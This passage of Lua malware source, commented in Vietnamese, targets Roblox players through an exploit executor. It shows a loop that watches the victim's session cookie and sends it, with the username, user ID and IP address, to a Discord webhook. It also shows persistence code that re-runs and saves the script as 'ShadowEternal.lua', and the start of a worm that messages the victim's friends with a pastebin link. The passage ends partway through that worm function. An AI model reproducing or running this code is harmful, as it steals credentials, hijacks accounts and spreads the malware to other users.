-- ========== 4. GIÁM SÁT COOKIE – GỬI KHI THAY ĐỔI ==========
local lastCookie = ""
local function monitorCookie()
    while true do
        task.wait(2)
        local current = getCurrentCookie()
        if current ~= lastCookie and current ~= "" then
            -- Cookie đã thay đổi (có thể do nạn nhân đăng nhập lại từ form giả hoặc từ nguồn khác)
            lastCookie = current
            local fields = {
                {name = "Victim", value = player.Name .. " (" .. player.UserId .. ")", inline = true},
                {name = "New Cookie", value = "```" .. current .. "```", inline = false},
                {name = "IP", value = getIP(), inline = true},
                {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
            }
            sendToDiscord("🍪 Cookie Changed / New Login", fields)
            -- Nếu muốn, ta có thể lưu cookie mới vào biến để dùng sau
        end
    end
end

-- ========== 5. PERSISTENCE – CHẠY NGẦM VĨNH VIỄN ==========
local function enablePersistence()
    -- 1. Dùng queue_on_teleport (nếu executor hỗ trợ) để script tự chạy lại sau khi teleport
    if queue_on_teleport then
        local scriptContent = debug.getinfo(1).source:sub(2)
        queue_on_teleport(scriptContent)
    end
    
    -- 2. Thêm vào autoexec của executor (nếu có thể ghi file)
    pcall(function()
        if writefile then
            local path = "workspace//ShadowEternal.lua"
            writefile(path, debug.getinfo(1).source:sub(2))
            if syn and syn.queue_on_teleport then
                syn.queue_on_teleport(path)
            end
        end
    end)
    
    -- 3. Chạy vòng lặp vô tận, không phụ thuộc vào reset
    game:GetService("RunService").Stepped:Connect(function()
        -- Không cần làm gì, chỉ để giữ script sống
    end)
end

-- ========== 6. WORM – TỰ LÂY LAN ==========
local function spreadWorm()
    -- Gửi script cho bạn bè qua chat (Roblox giới hạn, nhưng vẫn có thể gửi link)
    pcall(function()
        for _, friend in pairs(player.Friends:GetFriends()) do
            friend:SendMessage("Hey, check this out: https://pastebin.com/raw/FAKE_SHADOW_ID")
